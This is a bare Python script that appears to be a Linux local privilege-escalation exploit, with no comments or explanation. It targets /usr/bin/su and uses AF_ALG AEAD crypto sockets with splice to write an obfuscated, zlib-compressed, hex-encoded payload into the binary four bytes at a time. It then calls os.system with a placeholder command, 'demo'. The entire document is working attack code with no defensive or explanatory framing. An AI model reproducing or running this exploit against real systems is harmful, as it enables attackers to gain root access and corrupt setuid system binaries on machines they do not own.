import os
import socket
import zlib


SOL_ALG = 279
AF_ALG = 38
SOCK_SEQPACKET = 5

TARGET_BINARY = "/usr/bin/su"


def from_hex(hex_string: str) -> bytes:
    return bytes.fromhex(hex_string)


def create_alg_socket() -> socket.socket:
    errors = []

    for name in [
        "authencesn(hmac(sha256),cbc(aes))",
        "authenc(hmac(sha256),cbc(aes))",
    ]:
        sock = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)

        try:
            sock.bind(("aead", name))
            print(f"[+] using algorithm: {name}")
            return sock
        except OSError as exc:
            errors.append((name, exc))
            sock.close()

    detail = "\n".join(f"{name}: {exc}" for name, exc in errors)
    raise RuntimeError(f"no usable AEAD algorithm found:\n{detail}")


def configure_alg_socket(sock: socket.socket) -> None:
    key = from_hex("0800010000000010" + "0" * 64)

    sock.setsockopt(SOL_ALG, 1, key)
    sock.setsockopt(SOL_ALG, 5, None, 4)


def send_crypto_message(crypto_socket: socket.socket, payload: bytes) -> None:
    zero = b"\x00"

    crypto_socket.sendmsg(
        [b"A" * 4 + payload],
        [
            (SOL_ALG, 3, zero * 4),
            (SOL_ALG, 2, b"\x10" + zero * 19),
            (SOL_ALG, 4, b"\x08" + zero * 3),
        ],
        32768,
    )


def splice_file_to_socket(file_fd: int, socket_fd: int, length: int) -> None:
    read_fd, write_fd = os.pipe()

    try:
        os.splice(file_fd, write_fd, length, offset_src=0)
        os.splice(read_fd, socket_fd, length)
    finally:
        os.close(read_fd)
        os.close(write_fd)


def process_chunk(file_fd: int, offset: int, payload: bytes):
    alg_socket = create_alg_socket()

    try:
        configure_alg_socket(alg_socket)

        crypto_socket, _ = alg_socket.accept()

        try:
            length = offset + 4

            send_crypto_message(crypto_socket, payload)
            splice_file_to_socket(
                file_fd=file_fd,
                socket_fd=crypto_socket.fileno(),
                length=length,
            )

            try:
                return crypto_socket.recv(8 + offset)
            except Exception:
                return None

        finally:
            crypto_socket.close()

    finally:
        alg_socket.close()


def load_payload() -> bytes:
    compressed_payload = from_hex(
        "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    )

    return zlib.decompress(compressed_payload)


def main() -> None:
    file_fd = os.open(TARGET_BINARY, os.O_RDONLY)

    try:
        payload = load_payload()

        offset = 0

        while offset < len(payload):
            chunk = payload[offset:offset + 4]

            process_chunk(
                file_fd=file_fd,
                offset=offset,
                payload=chunk,
            )

            offset += 4

            os.system("demo")

    finally:
        os.close(file_fd)


if __name__ == "__main__":
    main()
